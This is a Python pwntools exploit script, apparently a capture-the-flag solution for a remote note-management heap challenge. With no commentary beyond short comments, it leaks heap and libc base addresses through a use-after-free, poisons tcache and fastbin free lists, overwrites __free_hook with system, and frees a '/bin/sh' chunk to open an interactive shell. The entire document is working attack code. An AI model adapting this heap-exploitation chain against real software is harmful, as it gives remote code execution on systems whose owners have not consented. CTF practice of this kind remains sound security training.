from pwn import *

#r = process("./share/chal")
r = remote('edu-ctf.zoolab.org',10015)
def add_note(idx):
    r.sendafter(b'> ',b'1')
    r.sendlineafter(b'> ',str(idx))

def edit_note(idx, size,data):
    r.sendafter(b'> ',b'2')
    r.sendlineafter(b'> ',str(idx))
    r.sendlineafter(b'> ',str(size))
    r.send(data)

def del_note(idx):
    r.sendafter(b'> ',b'3')
    r.sendlineafter(b'> ',str(idx))

def show_note():
    r.sendafter(b'> ',b'4')

for i in range(3):
    add_note(i)

for i in range(3):
    del_note(i)


### leak heap address
add_note(0)
edit_note(0,0x18,b'0')
show_note()
r.recvuntil(b'[0] ')
heap_base = u64(r.recv(6) + b'\x00\x00') - 0x230
print(f'heap base : {hex(heap_base)}' )
del_note(0)


add_note(2)
add_note(1)
add_note(0)

payload = p64(0) * 5 + p64(0x81) + p64(0) # fake chunk
#payload2 = p64(0) * 5 + p64(0x21) + p64(0) * 3 + p64(0x21)
edit_note(0,0x78,payload)
edit_note(2,0x28,b'ccccc')
edit_note(1,0x78,b'ccccc')

## fill tcache 
for i in range(3,3+7):
    add_note(i)

for i in range(3,3+7):
    del_note(i)

del_note(1)
del_note(0)

for i in range(3,3+7):
    add_note(i)

# fastbin and uaf to overwrite fd 
add_note(0)
edit_note(0,0x78,p64(heap_base + 0x330) + p64(0)) # change fd of free fastbin

edit_note(3,0x78,b'0')
payload = p64(0) * 9  + p64(0x421)
edit_note(4,0x78,payload)

add_note(10)
edit_note(10,0x68,b'ccccc')
add_note(11)
edit_note(11,0x68,b'ddddd')
add_note(12)
edit_note(12,0x68,b'eeeee')
add_note(13)
edit_note(13,0x68,b'fffff')
add_note(14)
edit_note(14,0x48,b'ggggg')
add_note(15)




del_note(2) ## unsorted_bin
edit_note(15,0x68,b'g')

show_note()
r.recvuntil(b'[15] ')
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x1ecf67
print(f'libc_base : {hex(libc_base)}')

free_hook = libc_base + 0x1eee48
system = libc_base + 0x52290
for i in range(9,2,-1):
    del_note(i)


add_note(3)
edit_note(3,0x68,b'123')
add_note(4)
edit_note(4,0x68,p64(0) + p64(0x21) + p64(free_hook) + p64(0)*2)
add_note(5)
add_note(6)
edit_note(6,0x18,p64(system))

edit_note(5,0x78,b'/bin/sh\x00')
del_note(5)
r.interactive()